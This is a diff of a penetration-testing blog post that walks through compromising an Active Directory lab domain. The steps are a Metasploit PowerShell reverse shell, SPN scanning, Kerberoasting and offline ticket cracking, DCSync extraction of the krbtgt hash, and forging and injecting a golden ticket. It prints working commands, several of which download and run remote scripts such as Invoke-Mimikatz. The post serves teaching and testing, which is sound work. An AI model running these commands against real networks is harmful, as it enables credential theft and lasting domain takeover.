 </code></pre></div><p>This will give you the raw payload you need to run to get a remote powershell shell. Copy the output from <code>IEX</code> all the way to <code>ReadToEnd();)</code> and paste that in a new file (I used <code>/root/power-shell.ps1</code>).</p>
 <p>Now, back at your metasploit session, background the meterpreter session and setup a new <code>exploit/multi/handler</code> for the <code>windows/powershell_reverse_tcp</code> payload. When you issue the <code>exploit</code> command, add <code>-j</code> so that the job will run in the background as we have one more thing to do before it will connect back.</p>
-<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_powershell_handler.png"/>
+<figure class=left>
+<img src=/images/kerberos_golden_ticket_powershell_handler.png>
 </figure>
-
 <p>Fantastic. We are ready to accept the powershell connection! The last thing left to do is to execute the script we generated earlier with <code>msfvenom</code>! Use the <code>exec_powershell</code> post module and configure it to pickup the script where ever you placed it on disk:</p>
-<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_exec_powershell.png"/>
+<figure class=left>
+<img src=/images/kerberos_golden_ticket_exec_powershell.png>
 </figure>
-
 <p>With the module configured to use the meterpreter session we originally got, as well as our exploit handler waiting in the background for the powershell connection, we issue the <code>run</code> command and hope it works!</p>
-<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_powershell_shell.png"/>
+<figure class=left>
+<img src=/images/kerberos_golden_ticket_powershell_shell.png>
 </figure>
-
 <blockquote>
 <p>Powershell session session 3 opened</p>
 </blockquote>
 <p>Ok, that was a lot of work, but now we have the environment we need to get on with the SPN scanning! Simply interact with the session that spawned.</p>
-<p>The next thing we want to do is get the <code>Find-PSServiceAccounts</code> PowerShell function into the environment. The script lives <a href="https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts">here</a>. Thankfully, we can kind of <em>include</em> functions into the current session by using the powershell <code>Invoke-Expression</code> cmdlet for a new <code>Net.WebClient</code> object. To do that we run:</p>
+<p>The next thing we want to do is get the <code>Find-PSServiceAccounts</code> PowerShell function into the environment. The script lives <a href=https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts>here</a>. Thankfully, we can kind of <em>include</em> functions into the current session by using the powershell <code>Invoke-Expression</code> cmdlet for a new <code>Net.WebClient</code> object. To do that we run:</p>
 <pre><code>Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Find-PSServiceAccounts')
 </code></pre><p>Thats it. We can now just run the method!!</p>
-<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_find_psserviceaccounts.png"/>
+<figure class=left>
+<img src=/images/kerberos_golden_ticket_find_psserviceaccounts.png>
 </figure>
-
 <p>We have just discovered the service account <code>svcSQLServ</code> and 2 hosts there it is in use!
 The script also accepts a few arguments, such as <code>-DumpSPN</code>:</p>
 <pre><code>PS C:\&gt; Find-PSServiceAccounts -DumpSPN
@@ -340,13 +212,13 @@ svcSQLServ/pc1.foo.local:1433
 svcSQLServ/pc2.foo.local:1433
 PS C:\Users\bobs\Downloads&gt;
 </code></pre><p>This is the part where I remind you about the <em>free port scan</em> I mentioned earlier. Notice how we have discovered services, ports and accounts running them using just a LDAP query. I highly doubt that will trigger many monitoring tools out there!</p>
-<h2 id="kerberos-service-tickets">kerberos service tickets</h2>
-<p>We now have 2 SPN&rsquo;s that we managed to query off the domain. <code>svcSQLServ/pc1.foo.local:1433</code> &amp; <code>svcSQLServ/pc2.foo.local:1433</code>. In order for clients to be able to authenticate to the services running as this user via kerberos, they would typically go through the process of requesting a service ticket.</p>
-<p><em>This is where you need to pay attention.</em> The service ticket is encrypted using the secret key (<em>read, &lsquo;password&rsquo;</em>) of the account used in the SPN (<code>svcSQLServ</code> in this case)! The server never checks if the ticket ever went through the entire process of actually being used, it just happily generates them for whoever asks&hellip; Note, the server hosting the service will still validate the ticket itself (99% of the time without rechecking the ticket with the Kerberos server).</p>
-<p>What does that mean for an attacker? Well, we can request the service ticket&hellip; and&hellip; attempt to decrypt it by brute forcing it offline! If the decryption is successful, then we have successfully compromised a service account.</p>
-<h2 id="enter-kerberoast">enter kerberoast</h2>
-<p><a href="https://github.com/nidem/kerberoast">Kerberoast</a> is a tool that can amongst other things, crack Kerberos ticket passwords. The general idea is that we get the SPN&rsquo;s (like we did), request kerberos service tickets for them, dump the ticket out of memory and send it to the <code>tgsrepcrack.py</code> script to crack against a wordlist.</p>
-<p>All of this can be done as a normal domain user and does not require any elevated privileges. To assist us in dumping kerberos tickets out of memory, we are going to load mimikatz by using <code>Invoke-Mimikatz</code> (from the <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">PowerSploit Repository</a>). This method has a very small to no chance of getting detected by AV atm. Lets get that loaded:</p>
+<h2 id=kerberos-service-tickets>kerberos service tickets</h2>
+<p>We now have 2 SPN&rsquo;s that we managed to query off the domain. <code>svcSQLServ/pc1.foo.local:1433</code> & <code>svcSQLServ/pc2.foo.local:1433</code>. In order for clients to be able to authenticate to the services running as this user via kerberos, they would typically go through the process of requesting a service ticket.</p>
+<p><em>This is where you need to pay attention.</em> The service ticket is encrypted using the secret key (<em>read, &lsquo;password&rsquo;</em>) of the account used in the SPN (<code>svcSQLServ</code> in this case)! The server never checks if the ticket ever went through the entire process of actually being used, it just happily generates them for whoever asks&mldr; Note, the server hosting the service will still validate the ticket itself (99% of the time without rechecking the ticket with the Kerberos server).</p>
+<p>What does that mean for an attacker? Well, we can request the service ticket&mldr; and&mldr; attempt to decrypt it by brute forcing it offline! If the decryption is successful, then we have successfully compromised a service account.</p>
+<h2 id=enter-kerberoast>enter kerberoast</h2>
+<p><a href=https://github.com/nidem/kerberoast>Kerberoast</a> is a tool that can amongst other things, crack Kerberos ticket passwords. The general idea is that we get the SPN&rsquo;s (like we did), request kerberos service tickets for them, dump the ticket out of memory and send it to the <code>tgsrepcrack.py</code> script to crack against a wordlist.</p>
+<p>All of this can be done as a normal domain user and does not require any elevated privileges. To assist us in dumping kerberos tickets out of memory, we are going to load mimikatz by using <code>Invoke-Mimikatz</code> (from the <a href=https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1>PowerSploit Repository</a>). This method has a very small to no chance of getting detected by AV atm. Lets get that loaded:</p>
 <pre><code>PS C:\&gt; Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
 PS C:\&gt; Invoke-Mimikatz
 
@@ -385,7 +257,7 @@ Current LogonId is 0:0x3fde2
 
 Cached Tickets: (0)
 PS C:\&gt;
-</code></pre><p>If you had tickets here, you can purge them from memory by running <code>Invoke-Mimikatz -Command '&quot;kerberos::purge&quot;'</code>.
+</code></pre><p>If you had tickets here, you can purge them from memory by running <code>Invoke-Mimikatz -Command '"kerberos::purge"'</code>.
 Lets request a service ticket for the <code>svcSQLServ/pc1.foo.local:1433</code> SPN (The command syntax can be seen in the Kerberoast repository):</p>
 <pre><code>PS C:\&gt; Add-Type -AssemblyName System.IdentityModel
 PS C:\&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;svcSQLServ/pc1.foo.local:1433&quot;
@@ -406,19 +278,19 @@ PS C:\&gt;
 PS C:\&gt; Find-PSServiceAccounts -DumpSPNs | ForEach-Object { New-Object System.Identity Model.Tokens.KerberosRequestorSecurityToken -ArgumentList $_ }
 
 </code></pre><p>Now, if we recheck the tickets we have for this session, we can see that we have one for <code>svcSQLServ</code>:</p>
-<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_spn.png"/>
+<figure class=left>
+<img src=/images/kerberos_golden_ticket_spn.png>
 </figure>
-
-<h2 id="dumping-kerberos-tickets-from-memory">dumping kerberos tickets from memory</h2>
+<h2 id=dumping-kerberos-tickets-from-memory>dumping kerberos tickets from memory</h2>
 <p>Remember, all of the actions performed thus far have been as a normal AD user with no special privileges. With the tickets now in memory, we can dump them to a file using mimikatz again. The mimikatz command we will use for this is <code>kerberos::list /export</code>:</p>
-<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_exported_tickets.png"/>
+<figure class=left>
+<img src=/images/kerberos_golden_ticket_exported_tickets.png>
 </figure>
-
 <p><code>1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi</code> is the Kerberos ticket dumped to disk! We can now transfer this to some place where we have Kerberoast downloaded and start cracking it! :D</p>
-<h2 id="cracking-the-kerberos-ticket">cracking the kerberos ticket</h2>
+<h2 id=cracking-the-kerberos-ticket>cracking the kerberos ticket</h2>
 <p>Back at my meterpreter session, we can simply download the ticket locally, and start the crack. <code>tgsrepcrack.py</code> allows you to specify tickets with a wildcard, so it will run the wordlist recursively over all of the tickets in a directory.</p>
-<p>So download the ticket&hellip;</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">meterpreter &gt; cd downloads/kerb
+<p>So download the ticket&mldr;</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>meterpreter &gt; cd downloads/kerb
 meterpreter &gt; ls
 Listing: C:\users\bobs\downloads\kerb
 =====================================
@@ -431,13 +303,13 @@ Mode              Size  Type  Last modified              Name
 meterpreter &gt; download 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi /root/
 [*] downloading: 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi -&gt; /root//1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
 [*] download   : 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi -&gt; /root//1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
-</code></pre></div><p>&hellip; and crack it!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">root@kali:~/kerberoast# python tgsrepcrack.py /usr/share/wordlists/fasttrack.txt /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
+</code></pre></div><p>&mldr; and crack it!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>root@kali:~/kerberoast# python tgsrepcrack.py /usr/share/wordlists/fasttrack.txt /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
 found password for ticket 0: Password1  File: /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
 All tickets cracked!
 </code></pre></div><p><code>Password1</code> is the password for the <code>svcSQLServ</code> account! \o/</p>
-<p>One reason why having the password for this account is especially bad is because of its group memberships&hellip; Yes, I know. You may not easily see this in real life, but just bear with me for now.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">PS C:\&gt; net user svcSQLServ /domain
+<p>One reason why having the password for this account is especially bad is because of its group memberships&mldr; Yes, I know. You may not easily see this in real life, but just bear with me for now.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>PS C:\&gt; net user svcSQLServ /domain
 The request will be processed at a domain controller for domain foo.local.
 
 User name                    svcSQLServ
@@ -467,18 +339,18 @@ Global Group memberships     *Domain Users         *Domain Admins
 The command completed successfully.
 
 PS C:\&gt;
-</code></pre></div><h2 id="testing-the-credentials">testing the credentials</h2>
+</code></pre></div><h2 id=testing-the-credentials>testing the credentials</h2>
 <p>For a bit of fun, lets test the credentials we just got using PowerShell Remoting. PowerShell Remoting is on by default on Server 2012 I believe.</p>
 <p>We will start by configuring a credentials object, and then just run the <code>Get-Process</code> cmdlet on the domain controller as proof.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">$pass = &#39;Password1&#39; | ConvertTo-SecureString -AsPlainText -Force
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>$pass = &#39;Password1&#39; | ConvertTo-SecureString -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential -ArgumentList &#39;svcSQLServ&#39;, $pass
 Invoke-Command -ScriptBlock {get-process} -ComputerName dc1 -Credential $creds
-</code></pre></div><p>With output&hellip;</p>
-<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_svcsqlserv_remoting.png"/>
+</code></pre></div><p>With output&mldr;</p>
+<figure class=left>
+<img src=/images/kerberos_golden_ticket_svcsqlserv_remoting.png>
 </figure>
-
-<p>So, we popped a service account with waaaay too much permissions and a crappy password. All that as a normal AD user&hellip;</p>
-<h1 id="golden-tickets">golden tickets</h1>
+<p>So, we popped a service account with waaaay too much permissions and a crappy password. All that as a normal AD user&mldr;</p>
+<h1 id=golden-tickets>golden tickets</h1>
 <p>We have domain administrative rights now. There is nothing left to do, we can write the pentest report and go home. Or can we? Well yes, but what if the password to <code>svcSQLServ</code> changes? That would mean we lose access! One way we can prevent this is by creating a <em>golden ticket</em> that we can re-use to grant ourselves whatever permission we like, as any user we like! Sounds great eh :D</p>
 <p>To create a golden ticket, we can use either the <em>kiwi</em> extension in metasploit, or <code>Invoke-Mimikatz</code> again! There are however a few prerequisites that we need to satisfy for golden tickets. The most important being that we need at least the NT hash of the <code>krbtgt</code> user of the domain. Without that, this is not a viable persistence strategy.</p>
 <p>The complete list of prerequisites are:</p>
@@ -488,10 +360,10 @@ Invoke-Command -ScriptBlock {get-process} -ComputerName dc1 -Credential $creds
 <li>The <code>krbtgt</code> accounts NT hash</li>
 <li>A username (fake or real, does not matter. Not fake if you need opsec ofc!)</li>
 </ul>
-<p>Getting the FQDN and SID (<code>whoami /user</code>) of the Domain should be relatively trivial. Remember to grab the SID without the <a href="https://en.wikipedia.org/wiki/Security_Identifier">trailing RID</a>. So if the full SID is <code>S-1-5-21-2222611480-1876485831-1594900117-1104</code> then you are only going to use <code>S-1-5-21-2222611480-1876485831-1594900117</code>.</p>
-<p>Getting the NT Hash of the <code>krbtgt</code> account though is something I want to show using a recent feature addition to mimikatz, <a href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/">DCSync</a>. The gist of it is that its possible to extract hashes from a Domain Controller (using a domain admin type account), without actually running any code on the Domain Controller itself! This is of course not the only way to get the required hash. Many of the older techniques work just fine. But, from a DCSync perspective, it essentially means hash extraction from any PC on the domain (authenticated as a admin), by ‘faking’ being a Domain Controller and triggering some replication-fu! In my case, I struggled a little to get this replication done from a client PC in the lab via the metasploit interactive PowerShell session, but could do it successfully from a client PC via the console. So, its definitely possible!</p>
-<p>In this case, to use the DCSync feature of mimikatz, I am going to use PowerShell Remoting to run commands. Unfortunately, due to the way <code>Enter-PSSession</code> sets up the shell, I can&rsquo;t seem to get an interactive shell as another user going without using another exploit &amp;&amp; payload combination. So, we are just going to use <code>Invoke-Command</code> with our commands.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">PS C:\&gt; $creds
+<p>Getting the FQDN and SID (<code>whoami /user</code>) of the Domain should be relatively trivial. Remember to grab the SID without the <a href=https://en.wikipedia.org/wiki/Security_Identifier>trailing RID</a>. So if the full SID is <code>S-1-5-21-2222611480-1876485831-1594900117-1104</code> then you are only going to use <code>S-1-5-21-2222611480-1876485831-1594900117</code>.</p>
+<p>Getting the NT Hash of the <code>krbtgt</code> account though is something I want to show using a recent feature addition to mimikatz, <a href=http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/>DCSync</a>. The gist of it is that its possible to extract hashes from a Domain Controller (using a domain admin type account), without actually running any code on the Domain Controller itself! This is of course not the only way to get the required hash. Many of the older techniques work just fine. But, from a DCSync perspective, it essentially means hash extraction from any PC on the domain (authenticated as a admin), by ‘faking’ being a Domain Controller and triggering some replication-fu! In my case, I struggled a little to get this replication done from a client PC in the lab via the metasploit interactive PowerShell session, but could do it successfully from a client PC via the console. So, its definitely possible!</p>
+<p>In this case, to use the DCSync feature of mimikatz, I am going to use PowerShell Remoting to run commands. Unfortunately, due to the way <code>Enter-PSSession</code> sets up the shell, I can&rsquo;t seem to get an interactive shell as another user going without using another exploit && payload combination. So, we are just going to use <code>Invoke-Command</code> with our commands.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>PS C:\&gt; $creds
 
 UserName                       Password
 --------                       --------
@@ -509,9 +381,9 @@ svcSQLServ
 <p>I constructed my command that needed to be run on my PowerShell session and ended up with this:</p>
 <pre><code>Invoke-Command -ScriptBlock {Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '&quot;lsadump::dcsync /user:krbtgt&quot;'} -Credential $creds -ComputerName dc1
 </code></pre><p>Let me try explain what is going on here. I am saying, <code>Invoke-Command</code> on the computer <code>dc1</code> as <code>svcSQLServ</code> (stored in the <code>$creds</code> variable) using PowerShell Remoting. The command to run is defined in the <code>ScriptBlock {}</code> which is i) download mimikatz ii) run <code>Invoke-Mimikatz</code> with the <code>lsadump::dcsync /user:krbtgt</code> command.</p>
-<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_krbtgt.png"/>
+<figure class=left>
+<img src=/images/kerberos_golden_ticket_krbtgt.png>
 </figure>
-
 <p>We have the hash for <code>krbtgt</code>! <code>95a11f7d93fa3a5a61073662e6bd8468</code> : D That means I have everything I need to create a golden ticket, with all the access in the world! To summarize, my prerequisites are satisfied with the following values:</p>
 <ul>
 <li>The Domains FQDN. <code>foo.local</code></li>
@@ -519,216 +391,66 @@ svcSQLServ
 <li>The <code>krbtgt</code> accounts NT hash. <code>95a11f7d93fa3a5a61073662e6bd8468</code></li>
 <li>A username (fake or real, does not matter. Not fake if you need opsec ofc!). <code>darthvader</code></li>
 </ul>
-<h2 id="creating-the-golden-ticket">creating the golden ticket</h2>
+<h2 id=creating-the-golden-ticket>creating the golden ticket</h2>
 <p>Creating the golden ticket is now a really simple task. We will simply call <code>Invoke-Mimikatz</code> again to generate the ticket. It will be saved to disk when it is generated. Thereafter, we will purge all the tickets we have for the session, and inject the golden ticket and test our access!</p>
-<p>For details about the command and arguments required, I referred to the <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver">mimikatz wiki</a> and replicated that. Our command should look something like the below, saving our golden ticket to <code>golden.tck</code> with access to a few builtin Windows Groups:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">kerberos::golden /user:darthvader /domain:foo.local /sid:S-1-5-21-2222611480-1876485831-1594900117 /krbtgt:95a11f7d93fa3a5a61073662e6bd8468 /ticket:golden.tck /groups:501,502,513,512,520,518,519
+<p>For details about the command and arguments required, I referred to the <a href=https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver>mimikatz wiki</a> and replicated that. Our command should look something like the below, saving our golden ticket to <code>golden.tck</code> with access to a few builtin Windows Groups:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>kerberos::golden /user:darthvader /domain:foo.local /sid:S-1-5-21-2222611480-1876485831-1594900117 /krbtgt:95a11f7d93fa3a5a61073662e6bd8468 /ticket:golden.tck /groups:501,502,513,512,520,518,519
 </code></pre></div><p>Running this mimikatz command with <code>Invoke-Mimikatz</code> gets us our Golden Ticket:</p>
-<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_created.png"/>
+<figure class=left>
+<img src=/images/kerberos_golden_ticket_created.png>
 </figure>
-
-<h2 id="injecting-the-golden-ticket">injecting the golden ticket</h2>
+<h2 id=injecting-the-golden-ticket>injecting the golden ticket</h2>
 <p>The final test is to <em>use</em> this ticket. For that, we will purge all Kerberos tickets in memory and inject the new golden ticket. Thereafter we will test if we can read the administrative <code>c$</code> share of the Domain Controller!</p>
 <p>Lets purge the currently cached Kerberos tickets first:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">PS C:\users\bobs\downloads\golden&gt; Invoke-Mimikatz -Command &#39;&#34;kerberos::purge&#34;&#39;
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>PS C:\users\bobs\downloads\golden&gt; Invoke-Mimikatz -Command &#39;&#34;kerberos::purge&#34;&#39;
 
 [... snip ...]
 
 mimikatz(powershell) # kerberos::purge
 Ticket(s) purge for current session is OK
 </code></pre></div><p>Next, we inject the golden ticket we created using the mimikatz <code>kerberos::ptt</code> command to <em>&lsquo;Pass The Ticket&rsquo;</em>:</p>
-<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_ptt.png"/>
+<figure class=left>
+<img src=/images/kerberos_golden_ticket_ptt.png>
 </figure>
-
-<p>After the ticket is injected into memory, we can verify its existence with the mimikaz <code>kerberos::list</code> command, or just using <code>klist</code>. Once it is injected, we <code>dir</code> the Domain Controllers <code>c$</code> share&hellip; an <em>smile</em>. The password for <code>scvSQLServ</code> can now change, it will no longer bother us!</p>
-<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_admin.png"/>
+<p>After the ticket is injected into memory, we can verify its existence with the mimikaz <code>kerberos::list</code> command, or just using <code>klist</code>. Once it is injected, we <code>dir</code> the Domain Controllers <code>c$</code> share&mldr; an <em>smile</em>. The password for <code>scvSQLServ</code> can now change, it will no longer bother us!</p>
+<figure class=left>
+<img src=/images/kerberos_golden_ticket_admin.png>
 </figure>
-
-<h2 id="conclusion">conclusion</h2>
+<h2 id=conclusion>conclusion</h2>
 <p>In this post we saw how it is possible to &lsquo;crack&rsquo; badly passworded and configured service accounts by querying for accounts by Service Principal Names. Those SPN&rsquo;s were then used to request Service Tickets from the Domain Controller, extracted from memory and cracked offline. All of that as a normal domain user.</p>
 <p>Then, we explored how it is possible to extract Domain Account hashes using the mimikatz <em>DCSync</em> feature and generate a Kerberos Golden Ticket with high access levels in the domain.</p>
-<p>I think there is still a loooong road ahead for the Microsoft Kerberos Implementations&hellip; Until they &lsquo;fix&rsquo; this stuff, things should remain interesting for quite some time to come.</p>
-    </div>
-  </article>
-
-  
-  
-
-
-
-
-  
-    <div class="blog-post-comments">
-        <div id="disqus_thread">
-          <script type="text/javascript">
-          
-          (function() {
-              
-              
-              
-              
-          
-              var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-              var disqus_shortname = 'slashnote';
-              dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-              (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-          })();
-          </script>
-          <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-          <a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-        </div>
-    </div>
-
-  
-
-
-  <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-          <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-          <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-          <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      <nav id="TableOfContents">
-  <ul>
-    <li><a href="#lets-set-the-scene">lets set the scene</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#spn-scanning---the-offensive-perspective">spn scanning - the offensive perspective</a>
-      <ul>
-        <li><a href="#setup-a-powershell-connection">setup a powershell connection</a></li>
-      </ul>
-    </li>
-    <li><a href="#kerberos-service-tickets">kerberos service tickets</a></li>
-    <li><a href="#enter-kerberoast">enter kerberoast</a></li>
-    <li><a href="#dumping-kerberos-tickets-from-memory">dumping kerberos tickets from memory</a></li>
-    <li><a href="#cracking-the-kerberos-ticket">cracking the kerberos ticket</a></li>
-    <li><a href="#testing-the-credentials">testing the credentials</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#creating-the-golden-ticket">creating the golden ticket</a></li>
-    <li><a href="#injecting-the-golden-ticket">injecting the golden ticket</a></li>
-    <li><a href="#conclusion">conclusion</a></li>
-  </ul>
-</nav>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      
-      <ul>
-  
-  
-    
-  
-  
-  <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f" aria-label="Facebook">
-      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&text=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Twitter">
-      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Linkedin">
-      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&is_video=false&description=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Pinterest">
-      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="mailto:?subject=kerberos%2c%20kerberoast%20and%20golden%20tickets&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f" aria-label="Email">
-      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Pocket">
-      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&title=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="reddit">
-      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&name=kerberos%2c%20kerberoast%20and%20golden%20tickets&description=%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fkerberos_golden_ticket_active_directory_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eActive%20Directory%20is%20almost%20always%20in%20scope%20for%20many%20pentests.%20There%20is%20sometimes%20a%20competitive%20nature%20amongst%20pentesters%20where%20the%20challenge%20is%20to%20see%20who%20can%20set%20a%20new%20record%20for%20gaining%20Domain%20Administrative%20privileges%20the%20fastest.%20How%20sad%20its%20that%3f%3c%2fp%3e%0a%3cp%3eThe%20reality%20is%2c%20%3cem%3emany%3c%2fem%3e%20times%2c%20the%20escalation%20processes%20is%20trivial.%20Pwn%20some%20workstation%20with%20admin%20creds%2c%20grab%20credentials%20out%20of%20%3ccode%3elsass%3c%2fcode%3e%20and%20pass%20the%20hash%20to%20move%20around%20laterally.%20This%20has%20been%20the%20typical%20breakfast%20of%20many%20pentesters.%20Heck%2c%20there%20are%20even%20attempts%20to%20%3ca%20href%3d%22https%3a%2f%2fgithub.com%2fsensepost%2fautoDANE%22%3eautomate%3c%2fa%3e%20this%20type%20of%20process%20because%2c%20personally%2c%20I%20feel%20its%20getting%20pretty%20old.%20Yet%2c%20its%20still%20very%20viable%20as%20an%20attack%20method%20due%20to%20its%20high%20success%20rate%21%3c%2fp%3e%0a%3cp%3eThis%20post%20however%20tries%20to%20look%20at%20it%20from%20a%20little%20fresher%20perspective.%20There%20are%20many%20posts%20like%20this%20out%20there%2c%20but%20this%20one%20is%20mine.%20Mostly%20just%20a%20brain%20dump%20that%20I%20can%20refer%20to%20later.%20Many%20others%20have%20written%20this%20up%20%28may